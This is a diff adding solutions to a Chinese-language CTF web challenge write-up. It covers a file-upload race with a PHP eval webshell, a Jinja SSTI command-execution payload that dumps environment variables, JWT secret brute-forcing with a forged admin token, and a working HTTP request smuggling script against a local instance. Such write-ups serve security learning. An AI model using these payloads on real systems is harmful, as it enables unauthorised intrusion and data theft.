@@ -258,7 +258,7 @@ print(unquote(r.headers["Location"]))
 输入1 and 1=1查询到了，1 and 1=2报错，判断是布尔盲注，黑名单禁用了union等关键词和字符  
 用AI写了个脚本  
 ```python
- import re
+import re
 import threading
 from concurrent.futures import ThreadPoolExecutor
 
@@ -403,10 +403,130 @@ if __name__ == "__main__":
 <img width="1101" height="396" alt="image" src="https://github.com/user-attachments/assets/02b2ce62-a770-4bc1-becb-f29eea72a8d3" />
 
 ## 我刚一提交就发现了三个问题
+文件上传，正常上传访问，文件已经被删除了，根据提示，是条件竞争，需要不断发包上传恶意文件  
+写个马：<?=eval($_REQUEST['cmd']);?>  
+这里抓包发送到Intruder进行持续请求，在这期间使用蚁剑连接  
+<img width="1917" height="1026" alt="image" src="https://github.com/user-attachments/assets/0628067f-e2c1-4884-aa63-f8fb60ca7273" />  
+添加成功，拿到flag  
+<img width="570" height="203" alt="image" src="https://github.com/user-attachments/assets/5f2ee19f-16e4-4541-bdb9-193cb9b75eaf" />
 
 ## 旧能源管理系统
+给了源码app.py,是无回显SSTI，username为注入点，这里使用重定向来回显  
+```python
+{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('env > static/env.txt').read() }}
+```
+再访问/static/env.txt，就能看到flag在环境变量里面
+
 ## 黑市走私
+先访问/hint查看提示，给了**入场券**和**暗语**，是JWT伪造，然后密钥应该是暗语中的一个,对密钥爆破，得到fish为正确密钥  
+拿到伪造JWT  
+```python
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI
+```  
+
+```python
+交易暗号：先让柜台只看货箱长度，再让后仓按分块清点。 目标货物：/flag1
+记得带上能证明你是高级买家的票据。
+```
+这里考察HTTP走私，利用前端和后端对 HTTP 请求结束边界解析不一致，TCP 长连接里多出的字节被后端当成下一条请求，实现走私，这里还需要去了解一下CL和TE  
+类似于  
+```python
+POST /stage1 HTTP/1.1
+Host: 127.0.0.1:47511
+Content-Length: 
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+0
+
+GET /flag1 HTTP/1.1
+Host: 127.0.0.1:47511
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI
+Connection: keep-alive
+```
+但是这里CL手动搓出错了做不出来，看了别的大佬的wp，用AI写了个脚本  
+```python
+import re
+import socket
+import time
+
+HOST = "127.0.0.1"
+PORT = 47511
+JWT = (
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
+    "eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ."
+    "EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI"
+)
+
+
+def get_flag(entry, target, transfer_encoding):
+    inner = (
+        f"GET {target} HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        f"Authorization: Bearer {JWT}\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+    )
+
+    body = "0\r\n\r\n" + inner
+
+    request = (
+        f"POST {entry} HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        f"Content-Length: {len(body.encode())}\r\n"
+        f"{transfer_encoding}\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n"
+        + body
+    ).encode()
+
+    flush = (
+        f"GET / HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+    ).encode()
+
+    with socket.create_connection((HOST, PORT), timeout=8) as sock:
+        sock.settimeout(2)
+        sock.sendall(request)
+        time.sleep(0.1)
+        sock.sendall(flush)
+
+        response = b""
+        while True:
+            try:
+                chunk = sock.recv(65536)
+            except socket.timeout:
+                break
+
+            if not chunk:
+                break
+
+            response += chunk
+
+    match = re.search(rb"flag\d+:[^\r\n]*", response, re.I)
+    return match.group().decode() if match else None
+
+
+flag1 = get_flag(
+    "/stage1",
+    "/flag1",
+    "Transfer-Encoding: chunked",
+)
+
+flag2 = get_flag(
+    "/stage2",
+    "/flag2",
+    "Transfer-Encoding : chunked",
+)
+
+print(flag1)
+print(flag2)
+```
+
 ## 七狗收费小说
+
 ## 巧乐兹
 ## 千度网盘
 ## moe论坛
